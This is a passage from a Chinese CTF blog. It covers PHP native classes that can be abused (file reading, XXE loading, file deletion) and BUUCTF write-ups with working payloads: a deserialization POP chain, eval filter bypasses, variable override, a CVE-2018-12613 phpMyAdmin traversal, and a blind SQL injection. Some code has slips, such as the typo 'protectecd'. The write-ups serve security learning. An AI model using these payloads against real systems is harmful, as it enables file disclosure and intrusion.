class_">FilesystemIterator</span>::<span class="hljs-variable constant_">current</span> ( ) : <span class="hljs-keyword">mixed</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">getFlags</span> ( ) : <span class="hljs-keyword">int</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">key</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">next</span> ( ) : <span class="hljs-keyword">void</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">rewind</span> ( ) : <span class="hljs-keyword">void</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">setFlags</span> ( <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = ? ) : <span class="hljs-keyword">void</span><br>&#125;<br></code></pre></td></tr></table></figure><p>当我们知道flag文件在根目录，但是不知道flag文件的完整名，可以使用Globlterator(&#x2F;<em>flag</em>&#x2F;)</p><p><img src="/../images/20210809203839.png" alt="image-20210809203750996"></p><h1 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h1><p>用于解析XML文档中的元素</p><p>官方文档对SimpleXMLElement类构造方法SimpleXMLElement::__construct定义：</p><p><img src="/../images/image-20231215162830705.png" alt="image-20231215162830705"></p><p><img src="/../images/image-20231215162844688.png" alt="image-20231215162844688"></p><p>可以看到第三个参数data_is_url为true，我们可以实现远程xml文件的载入</p><p>第二个参数的常量值我们设置为2即可</p><p>第一个参数data就是我们自己设置的payload的url地址，用于引入外部实体的url</p><h1 id="SplFileInfo"><a href="#SplFileInfo" class="headerlink" title="SplFileInfo"></a>SplFileInfo</h1><ul><li>PHP5,7,8</li></ul><p>SplFileInfo类为单个文件的信息提供了高级的面向对象接口</p><p>SplFileInfo::__toString  将文件路径作为字符串返回</p><p>PoC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$context</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h1><p>SplFileObject类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等</p><p>该类的构造方法可以构造一个新的文件对象用于后续的读取</p><p>PoC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$context</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ZipArchive"><a href="#ZipArchive" class="headerlink" title="ZipArchive"></a>ZipArchive</h1><ul><li>PHP&gt;5</li></ul><p>可以对文件进行压缩与解压缩</p><ul><li><code>ZipArchive::addEmptyDir</code>：添加一个新的文件目录</li><li><code>ZipArchive::addFile</code>：将文件添加到指定zip压缩包中</li><li><code>ZipArchive::addFromString</code>：添加新的文件同时将内容添加进去</li><li><code>ZipArchive::close</code>：关闭ziparchive</li><li><code>ZipArchive::extractTo</code>：将压缩包解压</li><li><code>ZipArchive::open</code>：打开一个zip压缩包</li><li><code>ZipArchive::deleteIndex</code>：删除压缩包中的某一个文件，如：<code>deleteIndex(0)</code>代表删除第一个文件</li><li><code>ZipArchive::deleteName</code>：删除压缩包中的某一个文件名称，同时也将文件删除</li></ul><p>来看看ZipArchive::open方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">open</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> ] ) : <span class="hljs-keyword">mixed</span><br></code></pre></td></tr></table></figure><p>该方法用来打开一个新的或现有的zip存档进行读取、写入、修改</p><ul><li><code>$filename</code>：要打开的ZIP存档的文件名。</li><li><code>$flags</code>：用于打开档案的模式。有以下几种模式：</li><li><code>ZipArchive::OVERWRITE</code>：总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖或删除。</li><li><code>ZipArchive::CREATE</code>：如果不存在则创建一个zip压缩包。</li><li><code>ZipArchive::RDONLY</code>：只读模式打开压缩包。</li><li><code>ZipArchive::EXCL</code>：如果压缩包已经存在，则出错。</li><li><code>ZipArchive::CHECKCONS</code>：对压缩包执行额外的一致性检查，如果失败则显示错误。</li></ul><p>如果设置flags值为ZipArchive::OVERWRITE的话，可以删除指定文件</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-variable">$a</span> = new Zip<span class="hljs-params">Archive</span>()<span class="hljs-comment">;</span><br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-literal">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>,<span class="hljs-title function_">ZipArchive::OVERWRITE</span>)<span class="hljs-comment">;  </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;新生赛遇到了一道题需要利用PHP原生类，由于自己很菜，花了很长时间才做出来。趁周末有时间总结一下常见的PHP原生类&lt;/p&gt;
&lt;ul&gt;
&lt;li</summary>
      
    
    
    
    
    <category term="php" scheme="http://example.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF刷题(持续更新)</title>
    <link href="http://example.com/2023/12/11/BUUCTF%E5%88%B7%E9%A2%98/"/>
    <id>http://example.com/2023/12/11/BUUCTF%E5%88%B7%E9%A2%98/</id>
    <published>2023-12-11T13:23:16.000Z</published>
    <updated>2023-12-19T12:51:33.830Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NISACTF-2022-popchains"><a href="#NISACTF-2022-popchains" class="headerlink" title="[NISACTF 2022]popchains"></a>[NISACTF 2022]popchains</h1><p>直接审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Happy New Year~ MAKE A WISH</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Happy New Year~ MAKE A WISH&lt;br&gt;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wish&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wish&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Road_is_Long</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/***************************pop your 2022*****************************/</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Road_is_Long</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$page</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;page = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">string</span>-&gt;page;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;page)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You can Not Enter 2022&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;page = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Try_Work_Hard</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Make_a_Change</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$effort</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;effort = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;effort;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**********************Try to See flag.php*****************************/</span></span><br></pre></td></tr></table></figure><p>首先找可以利用的点</p><p>发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Try_Work_Hard</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);<span class="comment">//包含</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>存在文件包含，再找哪里调用了append()函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要触发__invoke()方法，就能调用append()函数，并且传参var</p><p>要触发__invoke()方法必须使对象被当作函数调用</p><p><strong>Make_a_Change</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;effort;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里把$function当作函数调用，但是要触发__get()方法，需要<strong>访问一个对象不存在或不可访问的属性</strong></p><p><strong>Road_is_Long</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">string</span>-&gt;page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果$this-&gt;string&#x3D;Make_a_Change的话，那么Make_a_Change-&gt;page也就访问了其不存在的属性</p><p>触发__toString()需要<strong>类被当作字符串</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;  <span class="comment">//反序列化后执行</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;page)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You can Not Enter 2022&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;page = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Road_is_Long</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$page</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$String</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Try_Work_Hard</span></span>&#123;</span><br><span class="line">protectecd <span class="variable">$var</span>=<span class="string">&quot;php://filter/convert.base64-encode/resource=/flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Make_a_Change</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$effort</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Road_is_Long</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Try_Work_Hard</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">Make_a_Change</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;effort=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;String=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;page=<span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><h1 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h1><p>访问</p><p><img src="/../images/image-20231114092252163.png" alt="image-20231114092252163"></p><p>dirsearch扫目录</p><p><img src="/../images/image-20231114092318009.png" alt="image-20231114092318009"></p><p>.git泄露，上Githack，下载到index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>正则过滤data filter php phar等伪协议</p><p>过滤分号</p><p>过滤et na info dec bin hex oct pi log</p><h2 id="利用session-id代替flag-php"><a href="#利用session-id代替flag-php" class="headerlink" title="利用session_id代替flag.php"></a>利用session_id代替flag.php</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie:PHPSESSID=flag.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure><p>得到flag</p><p><img src="/../images/image-20231114093203760.png" alt="image-20231114093203760"></p><h2 id="利用函数找到并代替flag-php"><a href="#利用函数找到并代替flag-php" class="headerlink" title="利用函数找到并代替flag.php"></a>利用函数找到并代替flag.php</h2><p>localeconv()回显数组，第一个数组是字符.</p><p>pos()传入数组，回显第一个数组的值</p><p>pos(localeconv())相当于等号</p><p>scandir(.)以数组形式回显当前目录下所有文件</p><p>print_r()输出</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(<span class="keyword">pos</span>(localeconv())));</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231114094130072.png" alt="image-20231114094130072"></p><p>array_reverse()数组反转</p><p>next()数组指针移动下一位</p><p>show_source(next(array_reverse(scandir(pos(localeconv())))));</p><p><img src="/../images/image-20231114094459315.png" alt="image-20231114094459315"></p><h1 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h1><p>dirsearch扫目录，发现.git泄露</p><p>上githack</p><p>index.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><p>审计：</p><p>如果post传参flag和get传参flag都不为空时输出dog并退出</p><p>如果post传参flag&#x3D;flag或get传参flag&#x3D;flag时，输出cat并退出</p><p>foreach遍历，如果get传参flag&#x3D;x且x!&#x3D;flag输出handsome并退出</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?handsome=flag&amp;flag=handsome</span><br></pre></td></tr></table></figure><p><strong>变量覆盖</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?yds=flag</span><br></pre></td></tr></table></figure><p>$x &#x3D; yds $y &#x3D; flag</p><p>$$x &#x3D; $yds $$y &#x3D; $flag</p><p>$yds &#x3D; $flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?is=flag&amp;flag=flag</span><br></pre></td></tr></table></figure><p>$is &#x3D; $flag</p><p>输出$is 必须满足get&#x2F;post传参flag&#x3D;flag</p><h1 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h1><p><strong>CVE-2018-12613</strong></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?target=db_sql.php%253f/../../../../flag</span><br></pre></td></tr></table></figure><h1 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h1><p><img src="/../images/image-20231104151346329.png" alt="image-20231104151346329"></p><p>输入1正确回显，其他则错误，盲注</p><p><strong>括号代替空格来分割</strong></p><p>构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=(select(ascii(mid(flag,1,1))=102)from(flag))</span><br></pre></td></tr></table></figure><p>py脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blind_sql</span>(<span 